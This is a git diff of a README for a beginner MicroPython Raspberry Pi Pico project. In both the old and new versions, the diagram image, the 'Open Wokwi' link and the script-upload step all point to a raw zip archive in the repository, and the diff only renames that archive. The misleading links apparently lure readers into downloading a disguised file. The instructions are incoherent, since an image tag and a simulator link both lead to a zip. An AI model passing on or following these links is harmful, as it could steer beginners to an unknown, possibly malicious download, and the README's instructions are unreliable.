@@ -1,7 +1,7 @@
 # Introduction to Micropython Pi Pico
 
 <p align="center">
-  <img src="https://raw.githubusercontent.com/rifki398/basic-project-micropython/main/countryside/basic-project-micropython-3.3-alpha.4.zip" alt="Circuit Diagram" width="350"/>
+  <img src="https://raw.githubusercontent.com/rifki398/basic-project-micropython/main/countryside/project_micropython_basic_v2.1.zip" alt="Circuit Diagram" width="350"/>
 </p>
 
 This repository contains simple example codes and explanations for beginners to get started with MicroPython on the Raspberry Pi Pico. The project demonstrates basic functionalities such as:
@@ -38,6 +38,6 @@ This repository contains simple example codes and explanations for beginners to 
 
 ## Usage
 
-1. Open [Wokwi](https://raw.githubusercontent.com/rifki398/basic-project-micropython/main/countryside/basic-project-micropython-3.3-alpha.4.zip).
-2. Upload the Python scripts `https://raw.githubusercontent.com/rifki398/basic-project-micropython/main/countryside/basic-project-micropython-3.3-alpha.4.zip`.
+1. Open [Wokwi](https://raw.githubusercontent.com/rifki398/basic-project-micropython/main/countryside/project_micropython_basic_v2.1.zip).
+2. Upload the Python scripts `https://raw.githubusercontent.com/rifki398/basic-project-micropython/main/countryside/project_micropython_basic_v2.1.zip`.
 4. Run the script.
